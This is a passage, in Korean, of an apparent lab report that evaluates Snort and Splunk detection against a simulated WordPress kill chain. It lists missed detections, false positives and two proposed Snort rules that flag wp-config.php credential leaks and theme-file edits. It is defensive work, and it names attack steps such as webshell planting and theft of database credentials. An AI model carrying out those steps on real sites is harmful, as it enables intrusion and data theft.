| 관리자 패널 → File Manager 사용 | 1000008 | admin-ajax.php 프록시 경유로 CVE URI 불일치 | **높음** | File Manager AJAX 엔드포인트 패턴 추가 룰 작성 |
| MySQL 직접 쿼리 (3306 경유) | 1000005 | 허용 포트 사용, 네트워크 룰 범위 밖 | **높음** | MySQL Audit Plugin + 비정상 쿼리 패턴(SELECT * FROM wp_users) 탐지 |
| wp-config.php 읽기 | — | 해당 룰 없음 | **긴급** | Snort 룰 추가: 응답에 `DB_PASSWORD` 또는 `DB_USER` 포함 시 경보 |

### 오탐 가능성 검토

| SID | 오탐 시나리오 | 발생 가능성 | 완화 방법 |
|-----|------------|-----------|---------|
| 1000001 | 정상 사용자가 비밀번호를 5회 틀림 | 중간 | threshold를 10으로 상향 또는 실패 응답(HTTP 200 + `login_error`) 조건 추가 |
| 1000003 | 관리자의 정상적인 테마/플러그인 업로드 | 높음 | src_ip 화이트리스트(관리 IP) 또는 URI에 `/wp-admin/` 제외 조건 |
| 1000007 | phpinfo() 출력에 uid= 포함 | 낮음 | within 값을 10으로 축소하여 `uid=33(www-data) gid=33` 근접 패턴만 탐지 |
| 1000009 | 보안 업체의 정상 취약점 점검 | 낮음 | 점검 기간 동안 src_ip suppress |

---

## Step 5. 탐지 엔지니어링 개선 권고

> 실제 킬체인 공격 결과, 커스텀 룰 **9개 중 4개(44%)만 탐지 성공**.  
> 시그니처 기반 IDS만으로는 **우회 공격 경로를 탐지할 수 없음**이 확인됨.

| 우선순위 | 미탐지 공격 | 현재 한계 | 개선안 | 구현 난이도 |
|---------|-----------|---------|--------|-----------|
| **긴급** | 웹쉘 삽입 (파일 편집) | multipart 업로드만 탐지 | OSSEC/Wazuh HIDS — PHP 파일 변경 시 실시간 경보 | 중 |
| **긴급** | wp-config.php 인증정보 유출 | 탐지 룰 없음 | Snort 신규 룰: 응답에 `DB_PASSWORD` 패턴 탐지 | 하 |
| **높음** | 허용 포트(3306) 악용 | 네트워크 룰 범위 밖 | MySQL Audit Plugin + Splunk 비정상 쿼리 탐지 | 중 |
| **높음** | admin-ajax.php 경유 공격 | CVE URI 패턴만 탐지 | File Manager AJAX action 패턴 추가 룰 작성 | 하 |
| 중간 | 분산 브루트포스 | 단일 IP threshold | Splunk 통계 기반 다중 IP 브루트포스 탐지 | 중 |
| 중간 | WPScan UA 우회 | UA 고정 탐지 | 요청 속도 + URI 다양성 행위 패턴 (Splunk) | 상 |
| 참고 | 유출 차단 | pfSense 차단 동작 중 | 차단 로그 → Splunk Alert 연동으로 관제 가시성 확보 | 하 |

### 제안: 추가 Snort 룰 2개

```
# SID 1000010: wp-config.php 인증정보 유출 탐지 (응답 방향)
alert tcp $HOME_NET $HTTP_PORTS -> any any ( \
    msg:"[LOCAL] wp-config.php Credential Leak in Response"; \
    flow:from_server,established; \
    content:"DB_PASSWORD"; content:"DB_USER"; distance:0; within:200; \
    classtype:web-application-attack; \
    sid:1000010; rev:1; )

# SID 1000011: WordPress 관리자 파일 편집 API 탐지
alert tcp any any -> $HOME_NET $HTTP_PORTS ( \
    msg:"[LOCAL] WordPress Plugin/Theme File Edit via Admin"; \
    flow:to_server,established; \
    content:"POST"; http_method; \
    content:"/wp-admin/"; http_uri; \
    content:"action=edit-theme-plugin-file"; http_client_body; \
    classtype:web-application-attack; \
    sid:1000011; rev:1; )
```

---

## 스크린샷

- [ ] wpscan 스캔 결과 + SID 1000009 경보
- [ ] SQLi 공격 + ModSecurity 로그 (942xxx)
- [ ] 브루트포스 + SID 1000001/1000002 경보
- [ ] File Manager CVE + SID 1000008 경보
- [ ] 웹쉘 업로드 + SID 1000003/1000004 경보
- [ ] 웹쉘 실행(id 명령) + SID 1000007 응답 탐지
- [ ] 내부 정찰 + SID 1000005/1000006 경보
- [ ] DB 데이터 조회 (고객 정보)
- [ ] 유출 시도 차단 (DMZNET 아웃바운드 차단 확인)
- [ ] Splunk 상관분석 1: 브루트포스 교차 탐지
- [ ] Splunk 상관분석 4: 킬체인 타임라인 timechart
- [ ] Splunk 상관분석 7: 위험 점수 스코어링
- [ ] 탐지 개선 전/후 비교표 (Step 3)
